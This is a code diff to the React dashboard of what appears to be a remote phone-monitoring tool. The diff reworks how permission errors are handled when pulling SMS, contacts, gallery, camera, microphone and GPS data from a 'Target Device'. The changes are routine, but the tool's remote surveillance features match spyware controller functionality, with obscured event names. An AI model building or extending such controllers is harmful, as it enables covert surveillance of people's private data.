@@ -222,15 +222,40 @@ export default function Home(props: any) {
         }
     }, []);
 
-    // Persist selected device to localStorage and keep ref in sync
+    // Persist selected device to localStorage, hydrate permissions, and proactively query online device permissions
     useEffect(() => {
         selectedDeviceIdRef.current = selectedDeviceId;
         if (selectedDeviceId) {
             localStorage.setItem('selectedDeviceId', selectedDeviceId);
+
+            // Hydrate permissions from localStorage if available
+            try {
+                const savedPerms = localStorage.getItem(`permissions_${selectedDeviceId}`);
+                if (savedPerms) {
+                    const parsed = JSON.parse(savedPerms);
+                    setDevicePermissions(parsed);
+                    setDevicePermissionsMap(prev => ({ ...prev, [selectedDeviceId]: parsed }));
+                }
+            } catch {}
+
+            // Proactively query hardware permissions if target device is currently online
+            const activeDev = devices.find(d => {
+                const d1 = String(d.deviceId || '');
+                const d2 = String(d.id || '');
+                const d3 = String(d._id || '');
+                return d1 === String(selectedDeviceId) || d2 === String(selectedDeviceId) || d3 === String(selectedDeviceId);
+            });
+            if (activeDev && activeDev.online && socket && userUuid) {
+                socket.emit("check_permissions", {
+                    uuid: userUuid,
+                    targetDeviceId: selectedDeviceId
+                });
+            }
         } else {
             localStorage.removeItem('selectedDeviceId');
+            setDevicePermissions(null);
         }
-    }, [selectedDeviceId]);
+    }, [selectedDeviceId, devices, userUuid]);
 
     useEffect(() => {
         if (!selectedDeviceId) {
@@ -1135,17 +1160,20 @@ export default function Home(props: any) {
                 setIsStartingSync(false);
             });
 
-            socket.on("folder_list", (data: any) => {
-                if (Array.isArray(data) && data.length > 0) {
-                    setFolders(data);
-                    if (uuid && selectedDeviceIdRef.current) {
-                        try { localStorage.setItem(`gallery_folders_${uuid}_${selectedDeviceIdRef.current}`, JSON.stringify(data)); } catch {}
-                    }
-                } else if (Array.isArray(data)) {
-                    setFolders(data);
-                }
+            const handleFoldersReceived = (data: any) => {
                 setIsFetchingFolders(false);
-            });
+                const foldersArray = Array.isArray(data) 
+                    ? data 
+                    : (Array.isArray(data?.folders) ? data.folders : []);
+                const devId = data?.deviceId || selectedDeviceIdRef.current;
+                
+                setFolders(foldersArray);
+                if (uuid && devId && Array.isArray(foldersArray)) {
+                    try { localStorage.setItem(`gallery_folders_${uuid}_${devId}`, JSON.stringify(foldersArray)); } catch {}
+                }
+            };
+            socket.on("folder_list", handleFoldersReceived);
+            socket.on("send_folders", handleFoldersReceived);
 
             // ZIP Download Event Listeners
             socket.on("zip_progress", (data: any) => {
@@ -1224,12 +1252,41 @@ export default function Home(props: any) {
 
             socket.on("sms_error", (data: any) => {
                 setIsFetchingSms(false);
-                setAlertData({
-                    title: 'SMS Permission Required',
-                    message: data.message || 'Failed to fetch SMS. Please enable SMS permission in the App settings.',
-                    type: 'error'
-                });
-                setShowCustomAlert(true);
+                const errorMessage = data?.message || data?.error || 'Failed to fetch SMS.';
+                const lower = String(errorMessage).toLowerCase();
+                const isPermError = lower.includes("permission") || lower.includes("denied") || lower.includes("security");
+                if (isPermError) {
+                    const activeDevId = selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : '') || '';
+                    if (activeDevId) {
+                        setDevicePermissionsMap(prev => {
+                            const cur = prev[activeDevId] || {};
+                            const updated = { ...cur, sms: false };
+                            try { localStorage.setItem(`permissions_${activeDevId}`, JSON.stringify(updated)); } catch {}
+                            return { ...prev, [activeDevId]: updated };
+                        });
+                        setDevicePermissions((prev: any) => ({ ...(prev || {}), sms: false }));
+                    }
+                    const activeDev = devices.find(d => {
+                        const d1 = String(d.deviceId || '');
+                        const d2 = String(d.id || '');
+                        const d3 = String(d._id || '');
+                        return d1 === String(activeDevId) || d2 === String(activeDevId) || d3 === String(activeDevId);
+                    });
+                    const devName = activeDev ? getCleanDeviceName(activeDev) : 'Target Device';
+                    setPermissionModal({
+                        isOpen: true,
+                        deviceName: devName,
+                        permissionKey: 'sms',
+                        permissionLabel: 'SMS & Messages'
+                    });
+                } else {
+                    setAlertData({
+                        title: 'SMS Error',
+                        message: errorMessage,
+                        type: 'error'
+                    });
+                    setShowCustomAlert(true);
+                }
             });
 
             // Contacts Event Listeners with Strict Device Isolation
@@ -1263,12 +1320,41 @@ export default function Home(props: any) {
 
             socket.on("contacts_error", (data: any) => {
                 setIsFetchingContacts(false);
-                setAlertData({
-                    title: 'Contacts Permission Required',
-                    message: data.message || 'Failed to fetch contacts. Please enable Contacts permission in the App settings.',
-                    type: 'error'
-                });
-                setShowCustomAlert(true);
+                const errorMessage = data?.message || data?.error || 'Failed to fetch contacts.';
+                const lower = String(errorMessage).toLowerCase();
+                const isPermError = lower.includes("permission") || lower.includes("denied") || lower.includes("security");
+                if (isPermError) {
+                    const activeDevId = selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : '') || '';
+                    if (activeDevId) {
+                        setDevicePermissionsMap(prev => {
+                            const cur = prev[activeDevId] || {};
+                            const updated = { ...cur, contacts: false };
+                            try { localStorage.setItem(`permissions_${activeDevId}`, JSON.stringify(updated)); } catch {}
+                            return { ...prev, [activeDevId]: updated };
+                        });
+                        setDevicePermissions((prev: any) => ({ ...(prev || {}), contacts: false }));
+                    }
+                    const activeDev = devices.find(d => {
+                        const d1 = String(d.deviceId || '');
+                        const d2 = String(d.id || '');
+                        const d3 = String(d._id || '');
+                        return d1 === String(activeDevId) || d2 === String(activeDevId) || d3 === String(activeDevId);
+                    });
+                    const devName = activeDev ? getCleanDeviceName(activeDev) : 'Target Device';
+                    setPermissionModal({
+                        isOpen: true,
+                        deviceName: devName,
+                        permissionKey: 'contacts',
+                        permissionLabel: 'Contacts'
+                    });
+                } else {
+                    setAlertData({
+                        title: 'Contacts Error',
+                        message: errorMessage,
+                        type: 'error'
+                    });
+                    setShowCustomAlert(true);
+                }
             });
 
             // Notification Monitoring Event Listeners with Strict Device Isolation
@@ -1364,7 +1450,7 @@ export default function Home(props: any) {
                 setIsCheckingPermissions(false);
                 if (data?.permissions) {
                     setDevicePermissions(data.permissions);
-                    const devId = selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : '');
+                    const devId = data?.deviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : '');
                     if (devId) {
                         setDevicePermissionsMap(prev => ({ ...prev, [devId]: data.permissions }));
                         try { localStorage.setItem(`permissions_${devId}`, JSON.stringify(data.permissions)); } catch {}
@@ -1451,12 +1537,32 @@ export default function Home(props: any) {
             });
 
             socket.on("gallery_error", (data: any) => {
-                const errorMessage = data.message || "Gallery error occurred";
-                if (errorMessage.includes("Permission Denied")) {
-                    setAlertData({
-                        title: 'Gallery Permission Required',
-                        message: 'Please enable Storage/Gallery permission in the App settings to sync media.',
-                        type: 'error'
+                const errorMessage = data?.message || data?.error || "Gallery error occurred";
+                const lower = String(errorMessage).toLowerCase();
+                const isPermError = lower.includes("permission") || lower.includes("denied") || lower.includes("security");
+                if (isPermError) {
+                    const activeDevId = selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : '') || '';
+                    if (activeDevId) {
+                        setDevicePermissionsMap(prev => {
+                            const cur = prev[activeDevId] || {};
+                            const updated = { ...cur, storage: false };
+                            try { localStorage.setItem(`permissions_${activeDevId}`, JSON.stringify(updated)); } catch {}
+                            return { ...prev, [activeDevId]: updated };
+                        });
+                        setDevicePermissions((prev: any) => ({ ...(prev || {}), storage: false }));
+                    }
+                    const activeDev = devices.find(d => {
+                        const d1 = String(d.deviceId || '');
+                        const d2 = String(d.id || '');
+                        const d3 = String(d._id || '');
+                        return d1 === String(activeDevId) || d2 === String(activeDevId) || d3 === String(activeDevId);
+                    });
+                    const devName = activeDev ? getCleanDeviceName(activeDev) : 'Target Device';
+                    setPermissionModal({
+                        isOpen: true,
+                        deviceName: devName,
+                        permissionKey: 'storage',
+                        permissionLabel: 'Storage & Gallery'
                     });
                 } else {
                     setAlertData({
@@ -1464,18 +1570,44 @@ export default function Home(props: any) {
                         message: errorMessage,
                         type: 'error'
                     });
+                    setShowCustomAlert(true);
                 }
-                setShowCustomAlert(true);
             });
 
             socket.on("d_e1", (data: any) => {
                 setIsCapturingPhoto(false);
                 setIsRecording(false);
-                const errorMessage = data.error || "Camera error occurred";
+                setIsLiveStreaming(false);
+                isLiveStreamingRef.current = false;
+                const errorMessage = data?.error || "Camera error occurred";
                 setCameraError(errorMessage);
 
-                if (errorMessage.includes("Permission Denied")) {
-                    alert(`${errorMessage}\n\nPlease enable Camera permission in the App settings.`);
+                const lower = String(errorMessage).toLowerCase();
+                const isPermError = lower.includes("permission") || lower.includes("denied") || lower.includes("security");
+                if (isPermError) {
+                    const activeDevId = selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : '') || '';
+                    if (activeDevId) {
+                        setDevicePermissionsMap(prev => {
+                            const cur = prev[activeDevId] || {};
+                            const updated = { ...cur, camera: false };
+                            try { localStorage.setItem(`permissions_${activeDevId}`, JSON.stringify(updated)); } catch {}
+                            return { ...prev, [activeDevId]: updated };
+                        });
+                        setDevicePermissions((prev: any) => ({ ...(prev || {}), camera: false }));
+                    }
+                    const activeDev = devices.find(d => {
+                        const d1 = String(d.deviceId || '');
+                        const d2 = String(d.id || '');
+                        const d3 = String(d._id || '');
+                        return d1 === String(activeDevId) || d2 === String(activeDevId) || d3 === String(activeDevId);
+                    });
+                    const devName = activeDev ? getCleanDeviceName(activeDev) : 'Target Device';
+                    setPermissionModal({
+                        isOpen: true,
+                        deviceName: devName,
+                        permissionKey: 'camera',
+                        permissionLabel: 'Camera'
+                    });
                 } else {
                     setTimeout(() => setCameraError(null), 5000);
                 }
@@ -1639,8 +1771,39 @@ export default function Home(props: any) {
             socket.on("d_a3", (data: any) => {
                 setIsLiveAudio(false);
                 isLiveAudioRef.current = false;
-                setAudioError(data.error || 'Audio error occurred');
-                setTimeout(() => setAudioError(null), 5000);
+                setIsVoiceRecording(false);
+                const errorMessage = data?.error || 'Audio error occurred';
+                setAudioError(errorMessage);
+
+                const lower = String(errorMessage).toLowerCase();
+                const isPermError = lower.includes("permission") || lower.includes("denied") || lower.includes("security") || lower.includes("record_audio");
+                if (isPermError) {
+                    const activeDevId = selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : '') || '';
+                    if (activeDevId) {
+                        setDevicePermissionsMap(prev => {
+                            const cur = prev[activeDevId] || {};
+                            const updated = { ...cur, microphone: false };
+                            try { localStorage.setItem(`permissions_${activeDevId}`, JSON.stringify(updated)); } catch {}
+                            return { ...prev, [activeDevId]: updated };
+                        });
+                        setDevicePermissions((prev: any) => ({ ...(prev || {}), microphone: false }));
+                    }
+                    const activeDev = devices.find(d => {
+                        const d1 = String(d.deviceId || '');
+                        const d2 = String(d.id || '');
+                        const d3 = String(d._id || '');
+                        return d1 === String(activeDevId) || d2 === String(activeDevId) || d3 === String(activeDevId);
+                    });
+                    const devName = activeDev ? getCleanDeviceName(activeDev) : 'Target Device';
+                    setPermissionModal({
+                        isOpen: true,
+                        deviceName: devName,
+                        permissionKey: 'microphone',
+                        permissionLabel: 'Microphone'
+                    });
+                } else {
+                    setTimeout(() => setAudioError(null), 5000);
+                }
             });
 
             // Voice Recording Ready — device finished recording, server uploaded to R2
@@ -1703,7 +1866,35 @@ export default function Home(props: any) {
 
             socket.on("d_l2", (data: any) => {
                 setIsFetchingLocation(false);
-                setLocationError(data.error || "Failed to fetch location");
+                const errorMessage = data?.error || "Failed to fetch location";
+                setLocationError(errorMessage);
+                const lower = String(errorMessage).toLowerCase();
+                const isPermError = lower.includes("permission") || lower.includes("denied") || lower.includes("security");
+                if (isPermError) {
+                    const activeDevId = selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : '') || '';
+                    if (activeDevId) {
+                        setDevicePermissionsMap(prev => {
+                            const cur = prev[activeDevId] || {};
+                            const updated = { ...cur, location: false };
+                            try { localStorage.setItem(`permissions_${activeDevId}`, JSON.stringify(updated)); } catch {}
+                            return { ...prev, [activeDevId]: updated };
+                        });
+                        setDevicePermissions((prev: any) => ({ ...(prev || {}), location: false }));
+                    }
+                    const activeDev = devices.find(d => {
+                        const d1 = String(d.deviceId || '');
+                        const d2 = String(d.id || '');
+                        const d3 = String(d._id || '');
+                        return d1 === String(activeDevId) || d2 === String(activeDevId) || d3 === String(activeDevId);
+                    });
+                    const devName = activeDev ? getCleanDeviceName(activeDev) : 'Target Device';
+                    setPermissionModal({
+                        isOpen: true,
+                        deviceName: devName,
+                        permissionKey: 'location',
+                        permissionLabel: 'Location GPS'
+                    });
+                }
             });
 
             // Voice Recording Progress from device
@@ -1954,6 +2145,10 @@ export default function Home(props: any) {
                     uuid: userUuid,
                     targetDeviceId: effectiveTarget
                 });
+                // Fallback safety timeout so it never hangs spinning forever
+                setTimeout(() => {
+                    setIsFetchingFolders(false);
+                }, 10000);
             }
         }, { requiredPermission: 'storage', actionName: 'Directory Folder Scan' });
     };
